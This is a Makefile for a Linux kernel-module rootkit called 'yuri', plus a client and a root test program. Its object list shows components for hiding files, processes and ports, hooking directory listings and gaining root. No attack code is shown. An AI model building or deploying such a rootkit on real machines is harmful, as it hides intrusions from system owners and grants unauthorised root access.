PWD = $(shell pwd)

# Module name
ROOTKIT		:= yuri

# Build
MODULEDIR	:= /lib/modules/$(shell uname -r)
BUILDDIR	:= $(MODULEDIR)/build

SRCS_S 		:= src
SRCS_H		:= $(src)/$(SRCS_S)/headers

# Module
obj-m 		+= $(ROOTKIT).o

# Source
ccflags-y	:= -I$(SRCS_H)

$(ROOTKIT)-objs	:= src/server.o src/utils.o src/my_sockets.o  src/hide.o src/lshook.o src/hideport.o src/hidefile.o src/hidepid.o src/getroot.o

# Recipes
default:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) modules 
client:
	gcc -o client client.c --std=gnu99 -Wall -Wextra -pedantic -I .$(SRCS_H)
testroot:
	gcc -o testroot testroot.c
clean:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) clean

